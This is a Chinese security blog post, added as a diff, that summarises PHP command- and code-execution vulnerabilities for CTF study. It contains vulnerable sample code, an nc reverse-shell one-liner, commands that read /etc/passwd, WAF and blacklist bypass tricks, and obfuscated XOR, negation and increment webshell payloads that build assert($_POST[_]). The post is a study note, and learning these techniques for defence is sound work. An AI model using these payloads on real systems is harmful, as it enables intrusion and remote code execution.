@@ -1,0 +1,1244 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="命令执行漏洞总结, yyjccc的博客">
+    <meta name="description" content="命令执行漏洞（RCE）相关函数php 常见的调用外部程序的函数
+系统命令执行
+
+system(args)–有回显
+shell_exec(args)–无回显必须输出
+passthru()
+popen(handle,mode)–无回显
+exec">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>命令执行漏洞总结 | yyjccc的博客</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+    <style>
+        body{
+            background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+            background-repeat:no-repeat;
+            background-size: 100% 100%;
+            background-attachment:fixed;
+        }
+    </style>
+
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">yyjccc的博客</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">yyjccc的博客</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">命令执行漏洞总结</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">web安全 基础漏洞</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-08-05
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="命令执行漏洞（RCE）"><a href="#命令执行漏洞（RCE）" class="headerlink" title="命令执行漏洞（RCE）"></a>命令执行漏洞（RCE）</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>php 常见的调用外部程序的函数</p>
+<p>系统命令执行</p>
+<ol>
+<li>system(args)–有回显</li>
+<li>shell_exec(args)–无回显必须输出</li>
+<li>passthru()</li>
+<li>popen(handle,mode)–无回显</li>
+<li>exec(args)–回显最后一行，必须加echo输出</li>
+<li><strong>proc_open()</strong></li>
+<li><strong>&#96;(反单引号)</strong></li>
+</ol>
+<p>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“&#96;”的效果与函数 shell_exec() 相同。</p>
+<p>php代码执行</p>
+<ol>
+<li>assert()</li>
+<li>preg_replace ( $pattern ,$replacement ,  $subject [,  $limit &#x3D; -1 [, &amp;$count ]] )</li>
+</ol>
+<p>搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串</p>
+<ol>
+<li>eval()</li>
+<li>call_user_func (  $callback [, $parameter [, $… ]] )</li>
+</ol>
+<p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。</p>
+<ol>
+<li><strong>call_user_func_array($<strong><strong>callback</strong></strong>,$param_arr)</strong></li>
+</ol>
+<p>把第一个参数作为<strong>回调函数<strong><strong>（</strong></strong>callback****）</strong>调用，把参数数组作（param_arr）为回调函数的的参数传入string </p>
+<ol>
+<li>create_function ( $args , $code )</li>
+</ol>
+<p>该函数的内部实现用到了<code>eval</code>。第一个参数<code>args</code>是后面定义函数的参数，第二个参数是函数的代码。</p>
+<ol>
+<li>array_map ( callable $callback ,  $array1 [,  $… ] )</li>
+</ol>
+<p>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
+<p>示例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $a = $_GET[&#x27;chybeta&#x27;];</span><br><span class="line">        $b = create_function(&#x27;$a&#x27;,&quot;echo $a&quot;);</span><br><span class="line">        $b(&#x27;&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line">http://localhost:2500/codeexec.php?chybeta=phpinfo();</span><br><span class="line">&lt;?php</span><br><span class="line">        $array = array(0,1,2,3,4,5);</span><br><span class="line">        array_map($_GET[&#x27;chybeta&#x27;],$array);</span><br><span class="line">?&gt;</span><br><span class="line">http://localhost:2500/codeexec.php?chybeta=phpinfo</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>（1）管道操作</strong></p>
+<p>将一端的命令输出交给另一端的命令处理。格式：    命令1  |  命令2    </p>
+<p>如：ps aux | grep httpd</p>
+<p><strong>（2）重定向</strong></p>
+<p>改变执行命令时的默认输入输出</p>
+<p>类型操作符用途</p>
+<p>重定向输入                      &lt;                                  从指定文件读取数据而不是从键盘读取</p>
+<p>重定向输出                     &gt;   或&gt;&gt;                      将输出结果覆盖、追加到指定文件（&gt;覆盖、&gt;&gt;追加）</p>
+<p>重定向标准错误输出     2&gt;或 2&gt;&gt;                 将错误信息覆盖或追加到指定文件</p>
+<p>重定向混合输出             &amp;&gt; 或 &amp;&gt;&gt;               将标准输出和错误信息覆盖或追加到指定文件</p>
+<p><strong>（3)逻辑分割</strong></p>
+<p>处理多条命令之间的逻辑关系</p>
+<p>逻辑与                      &amp;&amp;      两条命令都要执行</p>
+<p>逻辑或                     ||           若第一条命令执行成功，则不执行第二条命令（即只要有一条命令成功就不再继续执行命令）</p>
+<p>顺序执行               ;              执行完第一条命令后执行第二条命令</p>
+<p>作用</p>
+<ol>
+<li>读取敏感文件   &#x2F;etc&#x2F;passwd</li>
+<li>NC反弹shell</li>
+</ol>
+<p>nc -e &#x2F;bin&#x2F;bash 127.0.0.1 3737</p>
+<h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><p>Bash 是GNU操作系统的 shell 或命令语言解释器</p>
+<h2 id="WAF-绕过"><a href="#WAF-绕过" class="headerlink" title="WAF****绕过"></a><strong>WAF****绕过</strong></h2><h3 id="常见的替换"><a href="#常见的替换" class="headerlink" title="常见的替换"></a>常见的替换</h3><p>空格</p>
+<blockquote>
+<p>&gt;     &lt;       &lt;&gt;</p>
+</blockquote>
+<p>shell下特殊符号</p>
+<p>$(base64编码内容|d -base64)</p>
+<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a><strong>通配符</strong></h3><p>在bash的操作环境中有一个非常有用的功能，那就是通配符，下面列出一些常用的通配符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*    代表『 0 个到无穷多个』任意字符</span><br><span class="line">?    代表『一定有一个』任意字符</span><br><span class="line">[ ]    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 [abcd] 代表『一定有一个字符， 可能是 a, b, c, d 这四个任何一个』</span><br><span class="line">[ - ]    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 [0-9] 代表 0 到 9 之间的所有数字，因为数字的语系编码是连续的！</span><br><span class="line">[^ ]    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 [^abc] 代表 一定有一个字符，只要是非 a, b, c 的其他字符就接受的意思。</span><br></pre></td></tr></table></figure>
+
+<h3 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a><strong>连接符</strong></h3><p>引号连接，注意要闭合好</p>
+<p>单引号</p>
+<p>&#x2F;‘b’i’n’&#x2F;‘c’a’t’ &#x2F;‘e’t’c’&#x2F;‘p’a’s’s’w’d</p>
+<p>双引号</p>
+<p>&#x2F;“b”i”n”&#x2F;“w”h”i”c”h” “n”c</p>
+<p>反斜杆</p>
+<p>&#x2F;b\i\n&#x2F;w\h\i\c\h n\c</p>
+<h3 id="正则表达式绕过"><a href="#正则表达式绕过" class="headerlink" title="正则表达式绕过"></a>正则表达式绕过</h3><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a><strong>空格绕过</strong></h4><ul>
+<li><code>&lt;</code> 符号 <code>cat&lt;123</code></li>
+<li><code>\t</code> &#x2F; <code>%09</code></li>
+<li><code>$&#123;IFS&#125;</code> 其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串</li>
+</ul>
+<h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a><strong>黑名单绕过</strong></h4><ul>
+<li><code>a=l;b=s;$a$b</code></li>
+<li>base64 <code>echo &quot;bHM=&quot; | base64 -d</code></li>
+<li><code>/?in/?s</code> &#x3D;&gt; <code>/bin/ls</code></li>
+<li>连接符 <code>cat /etc/pass&#39;w&#39;d</code></li>
+<li>未定义的初始化变量 <code>cat$x /etc/passwd</code></li>
+</ul>
+<h2 id="无字母-数字-RCE"><a href="#无字母-数字-RCE" class="headerlink" title="无字母(数字)RCE"></a>无字母(数字)RCE</h2><p>推荐p神的文章–<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
+<p>利用各种非数字字母的字符，经过各种变换（异或、取反、自增），构造出单个的字母字符，然后把单个字符拼接成一个函数名，比如说<code>assert</code>，然后就可以动态执行了。所以说这里的核心就是要将非字母的字符变换成字母字符。</p>
+<h3 id="1-异或"><a href="#1-异或" class="headerlink" title="1.异或 ^"></a>1.异或 ^</h3><p>指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，当我们想得到<code>a-z</code>中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成<code>ascii码</code>值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是<strong>相同为零，不同为一</strong></p>
+<p>因为很多都是不可见的字符，所以说我就先url编码了一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a:&#x27;%40&#x27;^&#x27;%21&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; e:&#x27;%7B&#x27;^&#x27;%1E&#x27; ; r:&#x27;%7E&#x27;^&#x27;%0C&#x27; ; t:&#x27;%7C&#x27;^&#x27;%08&#x27;</span><br><span class="line">P:&#x27;%0D&#x27;^&#x27;%5D&#x27; ; O:&#x27;%0F&#x27;^&#x27;%40&#x27; ; S:&#x27;%0E&#x27;^&#x27;%5D&#x27; ; T:&#x27;%0B&#x27;^&#x27;%5F&#x27;</span><br><span class="line">拼接起来：</span><br><span class="line">$_=(&#x27;%40&#x27;^&#x27;%21&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%1E&#x27;).(&#x27;%7E&#x27;^&#x27;%0C&#x27;).(&#x27;%7C&#x27;^&#x27;%08&#x27;); //$_=assert</span><br><span class="line">$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;%5D&#x27;).(&#x27;%0F&#x27;^&#x27;%40&#x27;).(&#x27;%0E&#x27;^&#x27;%5D&#x27;).(&#x27;%0B&#x27;^&#x27;%5F&#x27;);  //$__=_POST$___=$$__; $___=$_POST$_($___[_]);//assert($_POST[_]);放到一排就是：</span><br><span class="line">$_=(&#x27;%40&#x27;^&#x27;%21&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%1E&#x27;).(&#x27;%7E&#x27;^&#x27;%0C&#x27;).(&#x27;%7C&#x27;^&#x27;%08&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;%5D&#x27;).(&#x27;%0F&#x27;^&#x27;%40&#x27;).(&#x27;%0E&#x27;^&#x27;%5D&#x27;).(&#x27;%0B&#x27;^&#x27;%5F&#x27;);$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-取反"><a href="#2-取反" class="headerlink" title="2.取反 ~"></a>2.取反 ~</h3><p>一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。</p>
+<p>有参数函数要分开运算</p>
+<p>如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;ls /&#x27;);</span><br><span class="line">(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0); </span><br></pre></td></tr></table></figure>
+
+<p>利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code></p>
+<h3 id="3-自增"><a href="#3-自增" class="headerlink" title="3.自增"></a>3.自增</h3><p>只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p>
+<p>数组(Array)中就正好有大写字母<code>A</code>和小写字母<code>a</code>，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为<code>Array</code>，那取它的第一个子母，就拿到<code>A</code>了，那有了<code>a</code>和<code>A</code>，相当于我们就可以拿到<code>a-z</code>和<code>A-Z</code>中的所有字母了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[];</span><br><span class="line">$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;</span><br><span class="line">$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];</span><br><span class="line">$___=$_; // A</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; // E</span><br><span class="line"> $___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=&#x27;_&#x27;;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); // ASSERT($_POST[_]);</span><br></pre></td></tr></table></figure>
+
+<p>在php7中，我们可以使用($a)()这种方法来执行命令，如(call_user_func)(system,whoami,’’)</p>
+<p>php7特性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x27;var_dump&#x27;(&#x27;1111&#x27;);</span><br><span class="line"> (&quot;VAR_DUMP&quot;)(&quot;llll&quot;);</span><br><span class="line"> echo $_GET[ss];</span><br><span class="line">echo $_GET[&#x27;1&#x27;] . &#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">echo $_GET[1];</span><br><span class="line">$a = &#x27;_GET&#x27;;</span><br><span class="line">echo $$a[1];</span><br><span class="line">echo `pwd`;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2VjNzNlZjJhYWMwZjIzMTEwMTg1YzUyZTBkYjEzMWRfYUd4VUxXSmY5RzNEMUZOU1JwQXVFRmZ5Tlh4VXM4VmdfVG9rZW46WmZiemJLdWZYb3lZZEp4cEVKbmNzZVhJbmViXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<h3 id="4-临时文件"><a href="#4-临时文件" class="headerlink" title="4.临时文件"></a>4.<strong>临时文件</strong></h3><p>利用通配符</p>
+<p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，</p>
+<p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p>
+<p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p>
+<p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p>
+<p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p>
+<p>最后，我传入的code为<code>?&gt;&lt;?=. /???/????????[@-[];?&gt;</code>，发送数据包如下：</p>
+<p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDgxMDVlOWRjZjg0NjU4OTAyOTY5NjBlOTZjNTk2ZTdfQXBMOWVUbjNYbE45YlkzM1Z3RXVXb282ck9heWQ1ME5fVG9rZW46RUYzd2JmRWt6b2JkRXl4NkFlRGNVQ0tpbmxiXzE2OTEyNDk2NTM6MTY5MTI1MzI1M19WNA" alt="img"></p>
+<p>成功执行任意命令。</p>
+<h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势</p>
+<h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; </span><br><span class="line"> eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
